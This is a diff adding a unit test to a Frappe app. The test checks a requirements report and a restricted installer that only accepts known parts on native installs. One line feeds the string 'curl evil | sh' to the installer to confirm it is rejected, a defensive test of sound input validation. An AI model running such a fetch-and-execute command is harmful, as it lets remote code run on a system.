@@ -1895,3 +1895,34 @@ class TestRomanisedSearch(OpsTestCase):
 		frappe.db.set_single_value("RD Settings", "search_romanised", 0)
 		frappe.clear_document_cache("RD Settings", "RD Settings")
 		self.assertEqual(self.found("vachana"), (set(), []))
+
+
+class TestRequirements(OpsTestCase):
+	def test_the_list_and_installing_from_the_desk(self):
+		from sok_resdesk import requirements
+
+		report = requirements.report(refresh=1)
+		keys = {i["key"] for i in report["items"]}
+		self.assertTrue(
+			{"python", "frappe", "mariadb", "redis", "meilisearch", "tesseract", "boto3", "disk"} <= keys
+		)
+		python = next(i for i in report["items"] if i["key"] == "python")
+		self.assertEqual(python["state"], "ok")
+		self.assertTrue(all(i["state"] in ("ok", "missing", "old", "warn", "off") for i in report["items"]))
+		self.assertIn(requirements.health_check()["state"], ("ok", "warn", "bad"))
+		# installing: only the known parts, only on native installs, through the helper
+		self.assertRaises(frappe.ValidationError, requirements.install, "curl evil | sh")
+		with mock.patch("sok_resdesk.requirements.install_mode", return_value="docker"):
+			self.assertRaises(frappe.ValidationError, requirements.install, "ocr")
+		with (
+			mock.patch("sok_resdesk.requirements.install_mode", return_value="native"),
+			mock.patch("sok_resdesk.server.helper_configured", return_value=True),
+			mock.patch("sok_resdesk.server.helper_connected", return_value=True),
+			mock.patch("sok_resdesk.server.desk_control_allowed", return_value=True),
+		):
+			name = requirements.install("ocr")
+		task = frappe.get_doc("RD Server Task", name)
+		self.assertEqual(
+			(task.action, frappe.parse_json(task.args)), ("install_requirements", {"part": "ocr"})
+		)
+		frappe.delete_doc("RD Server Task", name, force=True, ignore_permissions=True)
